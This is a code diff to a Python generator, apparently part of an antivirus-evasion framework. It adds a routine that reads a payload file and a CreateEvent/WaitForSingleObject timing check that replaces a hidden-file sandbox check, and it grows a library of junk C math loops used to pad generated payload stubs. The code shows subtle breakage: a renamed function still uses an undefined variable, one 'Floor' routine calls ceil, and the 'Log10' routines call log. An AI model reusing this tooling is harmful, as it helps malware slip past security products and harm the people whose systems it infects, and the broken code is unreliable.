@@ -27,6 +27,16 @@ import Multibyte_xor
 import Multibyte_xorPy3
 sys.dont_write_bytecode = True
 
+def readpayload_exfile():
+
+    Payload = ""
+    payload_file = open("payload.txt","r")
+    for line in payload_file:
+        Payload += line
+
+    return Payload
+    
+
 def encoding_manager(Encryption,Payload,Randbufname):
 
     if Encryption == "1":
@@ -126,21 +136,14 @@ def windows_evasion():
         Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
         Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"
 
-    elif number == 3:  # Create file Set attribute_hidden and remove it 
-        Randvarname = varname_creator()
-        junk = varname_creator()
-        Randfileptr = varname_creator()
-        Randfilename = varname_creator()
-        Randattr = varname_creator()        
-        Evasion_code += "char " + Randvarname + "[] = " + "\"" + junk + "\";\n" 
-        Evasion_code += "FILE *" + Randfileptr + " = fopen(\"" + Randfilename + "\",\"w\");\n"
-        Evasion_code += "fputs(" + Randvarname + "," + Randfileptr + ");\n"
-        Evasion_code += "fclose(" + Randfileptr + ");\n"
-        Evasion_code += "DWORD " + Randattr + " = GetFileAttributes(\"" + Randfilename + "\");\n"
-        Evasion_code += "SetFileAttributes(\"" + Randfilename + "\"," + Randattr + " + FILE_ATTRIBUTE_HIDDEN);\n"
-        Evasion_code += "if ((" + Randfileptr + " = fopen(\"" + Randfilename + "\", \"r\"))){\n"
-        Evasion_code += "fclose(" + Randfileptr + ");\n"
-        Evasion_code += "remove(\"" + Randfilename + "\");\n"
+    elif number == 3: # Create a non-signaled Event time attack
+        RandEvent = varname_creator()
+        RandWaitsob = varname_creator() 
+        Randsleep = str(random.randint(1000,1600))
+        Evasion_code += "HANDLE " + RandEvent + " = CreateEvent(NULL, TRUE, FALSE, NULL);"
+        Evasion_code += "if (" + RandEvent + " != NULL){\n"
+        Evasion_code += "DWORD " + RandWaitsob + " = WaitForSingleObject(" + RandEvent + "," + Randsleep + ");\n"
+
 
 
     elif number == 4: # dynamic big mem alloc then zero-out
@@ -336,7 +339,7 @@ def close_brackets_multiproc(number):
     return brack
 
 
-def windows_junkcode(number):
+def InjectMessageBox(text):
     Winjunk_code = ""
 
     if number == "1":
@@ -427,7 +430,7 @@ def python_poly_multipath(number,step):
 
 def Junkmathinject():
 
-    number = random.randint(1,37)
+    number = random.randint(1,59)
 
     if number == 1: #sum firs n integer 1 
         Randcounter = varname_creator()
@@ -1237,7 +1240,375 @@ def Junkmathinject():
         Junkcode += RandPI + " += (pow(-1," + Randflag + "+ 1.000))/(2.000*" + Randflag + "-1.000);}while(" + Randflag + " < " + RandRange + "-1);\n"
         Junkcode += RandPI + " = " + RandPI + "*4;\n"   
 
-                 
+    elif number == 38: # Ceil routine 1
+
+
+        RandRange = str(random.randint(5000000,10000000))
+        RandVar = varname_creator()
+        RandVar2 = varname_creator()
+        Randflag = varname_creator() 
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "double *" + RandVar2 + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);}\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar2 + "[" + Randflag + "] = ceil(" + RandVar + "[" + Randflag + "]);}\n"
+
+    elif number == 39: # Ceil routine 2
+
+
+        RandRange = str(random.randint(5000000,8000000))
+        RandVar = varname_creator()
+        RandVar2 = varname_creator()
+        Randflag = varname_creator() 
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + " = -1;\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "double *" + RandVar2 + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);\n"
+        Junkcode += RandVar2 + "[" + Randflag + "] = ceil(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+
+    elif number == 40: # Floor routine 1
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        RandVar2 = varname_creator()
+        Randflag = varname_creator() 
+
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "double *" + RandVar2 + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);}\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar2 + "[" + Randflag + "] = floor(" + RandVar + "[" + Randflag + "]);}\n"
+
+    elif number == 41: # Floor routine 2
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        RandVar2 = varname_creator()
+        Randflag = varname_creator() 
+
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + " = -1;\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "double *" + RandVar2 + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);\n"
+        Junkcode += RandVar2 + "[" + Randflag + "] = ceil(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+
+    elif number == 42: # Acos routine 1
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        RandVar2 = varname_creator()
+        Randflag = varname_creator() 
+ 
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = acos(" + RandVar + "[" + Randflag + "]);}\n"
+
+    elif number == 43: # Acos routine 2
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + "=-1;\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);\n"
+        Junkcode += RandVar + "[" + Randflag + "] = acos(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+    elif number == 44: # Asin routine 1
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+ 
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = asin(" + RandVar + "[" + Randflag + "]);}\n"
+
+    elif number == 45: # Asin routine 2
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + "=-1;\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);\n"
+        Junkcode += RandVar + "[" + Randflag + "] = asin(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+    elif number == 46: # Atan routine 1
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = ((double)rand() / (double)(RAND_MAX));}\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = atan(" + RandVar + "[" + Randflag + "]);}\n"
+
+    elif number == 47: # Atan routine 2
+
+
+        RandRange = str(random.randint(5000000,8000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + "=-1;\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + "[" + Randflag + "] = ((double)rand() / (double)(RAND_MAX));\n"
+        Junkcode += RandVar + "[" + Randflag + "] = atan(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+    elif number == 48: # Fabs routine 1
+
+
+        RandRange = str(random.randint(5000000,10000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+         
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = fabs(" + RandVar + "[" + Randflag + "]);}\n"
+
+
+    elif number == 49: # Fabs routine 2
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+ 
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + "=-1;\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);\n"
+        Junkcode += RandVar + "[" + Randflag + "] = fabs(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+    elif number == 50: # Exp routine 1
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+         
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double " + RandVar + ";\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + " = exp((double)(" + str(random.randint(2,10)) + "*rand() / (double)(RAND_MAX)));}\n"
+
+
+    elif number == 51: # Exp routine 2
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+         
+        Junkcode = ""
+        Junkcode += "int " + Randflag + "=-1;\n"
+        Junkcode += "double " + RandVar + ";\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + " = exp((double)(" + str(random.randint(2,10)) + "*rand() / (double)(RAND_MAX)));}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+
+    elif number == 52: # Ln routine 1
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+         
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double " + RandVar + ";\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + " = log((double)(" + str(random.randint(20,1000)) + "*rand() / (double)(RAND_MAX)));}\n"
+
+
+    elif number == 53: # Ln routine 2
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+         
+        Junkcode = ""
+        Junkcode += "int " + Randflag + "=-1;\n"
+        Junkcode += "double " + RandVar + ";\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + " = log((double)(" + str(random.randint(20,1000)) + "*rand() / (double)(RAND_MAX)));}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+
+    elif number == 54: # Log10 routine 1
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+         
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double " + RandVar + ";\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + " = log((double)(" + str(random.randint(20,1000)) + "*rand() / (double)(RAND_MAX)));}\n"
+
+
+    elif number == 55: # Log10 routine 2
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+         
+        Junkcode = ""
+        Junkcode += "int " + Randflag + "=-1;\n"
+        Junkcode += "double " + RandVar + ";\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + " = log((double)(" + str(random.randint(20,1000)) + "*rand() / (double)(RAND_MAX)));}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+    elif number == 56: # Fmod routine 1
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = ((double)rand() / (double)(RAND_MAX));}\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += RandVar + "[" + Randflag + "] = fmod(" + RandVar + "[" + Randflag + "],(double)(rand() % 100));}\n"
+
+    elif number == 57: # Fmod routine 2
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+
+
+        
+        Junkcode = ""
+        Junkcode += "int " + Randflag + "=-1;\n"
+        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += RandVar + "[" + Randflag + "] = ((double)rand() / (double)(RAND_MAX));\n"
+        Junkcode += RandVar + "[" + Randflag + "] = fmod(" + RandVar + "[" + Randflag + "],(double)(rand() % 100));}while(" + Randflag + " < " + RandRange + "-1);\n"
+
+    elif number == 58: # Ldexp routine 1
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+        Randinteger = varname_creator()
+         
+        Junkcode = ""
+        Junkcode += "int " + Randinteger + ";\n"
+        Junkcode += "int " + Randflag + ";\n"
+        Junkcode += "double " + RandVar + ";\n"
+        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
+        Junkcode += Randinteger + " = rand() % " + str(random.randint(16,32)) + ";\n"
+        Junkcode += RandVar + " = ldexp((double)(rand() / (double)(RAND_MAX))," + Randinteger + ");}\n"
+
+
+    elif number == 59: # Ldexp routine 2
+
+
+        RandRange = str(random.randint(4000000,6000000))
+        RandVar = varname_creator()
+        Randflag = varname_creator() 
+        Randinteger = varname_creator()
+         
+        Junkcode = ""
+        Junkcode += "int " + Randinteger + ";\n"
+        Junkcode += "int " + Randflag + "=-1;\n"
+        Junkcode += "double " + RandVar + ";\n"
+        Junkcode += "do{\n"
+        Junkcode += Randflag + "++;\n"
+        Junkcode += Randinteger + " = rand() % " + str(random.randint(16,32)) + ";\n"
+        Junkcode += RandVar + " = ldexp((double)(rand() / (double)(RAND_MAX))," + Randinteger + ");}while(" + Randflag + " < " + RandRange + "-1);\n"
+            
     return Junkcode
 
 
